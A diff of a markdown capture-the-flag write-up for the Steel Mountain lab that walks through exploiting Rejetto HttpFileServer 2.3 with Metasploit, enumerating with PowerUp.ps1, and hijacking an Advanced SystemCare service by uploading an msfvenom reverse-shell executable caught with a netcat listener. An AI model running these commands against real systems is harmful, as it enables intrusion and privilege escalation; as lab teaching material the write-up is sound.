@@ -1,23 +1,23 @@
 Let's begin by exporting the IP as 'target' in the environment variables: `export target=IP`
-![[Pasted image 20251115072758.png]]
+![](https://github.com/user-attachments/assets/d725ed03-afb0-494a-b2b8-affaa7c3391e)
 
 Create a 'SteelMountain' directory and scan the network with rustscan followed by a more precise scan with nmap: `rustscan -a $target --ulimit 5000 -- -sC -sV -oA scan`
-![[Pasted image 20251115073314.png]]
+![](https://github.com/user-attachments/assets/3cc166e7-a692-4bae-8e1c-89fbbcf55681)
 
-![[Pasted image 20251115073649.png]]
+![](https://github.com/user-attachments/assets/ea4285ba-2bc5-4a98-ae95-a6a6dd5777ea)
 
-![[Pasted image 20251115083335.png]]
+![](https://github.com/user-attachments/assets/e832bf8f-5ddd-4afe-8f8e-1a9f02d9c342)
 
 As you can see there are many ports open. Let's begin by visiting the website:
-![[Pasted image 20251115084322.png]]
+![](https://github.com/user-attachments/assets/954cdf5f-cbda-44a5-a240-f505642e9d7c)
 By right clicking the image and inspecting it, we can find the name of the employee of the month and answer the first question.
 
 It seems there are no other links or interesting things in this page. Let's try port 8080:
-![[Pasted image 20251115084903.png]]
+![](https://github.com/user-attachments/assets/60631de5-5140-4971-9046-a49c0ac4e582)
 In the lower-left corner of the screen you can see the name and version of the file server. Doing a quick research on google we can see it is a Rejetto HttpFileServer 2.3.
 
 First, we will exploit this using Metasploit. Let's fire it up and search for rejetto exploits:
-![[Pasted image 20251115090415.png]]
+![](https://github.com/user-attachments/assets/54502ade-ccaa-4674-9598-39aef6bdf409)
 We will use the 2014 one: `use 1`.
 
 Now let's configure the options `show options` and let's make some changes:
@@ -26,14 +26,14 @@ Now let's configure the options `show options` and let's make some changes:
 `set LHOST <local IP>`
 We can leave the LPORT to 4444
 And finally hit `run` or `exploit`!
-![[Screenshot 2025-11-15 093743.png]]
+![](https://github.com/user-attachments/assets/8883396f-88a0-40e4-80b4-1a02c548e4b7)
 And...We're in! `getuid` `STEELMOUNTAIN\bill`
 
 Now we will use the `upload` functionality of meterpreter to upload `PowerUp.ps1` in the `%TEMP%` folder:
-![[Pasted image 20251115105212.png]]
+![](https://github.com/user-attachments/assets/928397a9-fd95-4ee7-a4a5-ec8a8f4c544c)
 
 It's time to `load powershell` and open `powershell_shell` to fire up `PowerUp.ps1` and `Invoke-AllChecks` to do some enumeration:
-![[Pasted image 20251115105658.png]]
+![](https://github.com/user-attachments/assets/16778245-36ec-4fc0-9877-7ed4e9bd9b7f)
 
 The first entry is what we need.
 An Advanced SystemCare9 service that we `CanRestart : True` with `AppendData` permissions, running as `LocalSystem` to escalate our privileges.
@@ -41,13 +41,13 @@ An Advanced SystemCare9 service that we `CanRestart : True` with `AppendData` pe
 
 What we need now is to exit from the powershell istance `CTRL+C` and enter cmd `shell` to `sc stop AdvancedSystemCareService9` to upload the msfvenom shell we will create now in another terminal in our kali attacker, named as the executable `ASCService.exe`:
 `msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe`
-![[Pasted image 20251115111742.png]]
+![](https://github.com/user-attachments/assets/e11027f6-b3db-47f2-b603-4ec01efbcd2e)
 
-![[Pasted image 20251115111953.png]]
+![](https://github.com/user-attachments/assets/5f701340-d0eb-42cc-8190-32116130314c)
 
 We will now move to the folder of the service's executable `C:\Program Files (x86)\IObit\Advanced Systemcare\` and go back to meterpreter to upload our shell. 
 The upload function of meterpreter will automatically overwrite the file.
-![[Pasted image 20251115113801.png]]
+![](https://github.com/user-attachments/assets/966063c5-22f4-431f-addc-29eac14ca34b)
 
 Now it's time to fire up netcat `nc -lvnp 4445` and start the service:
 ![[Pasted image 20251115114224.png]]
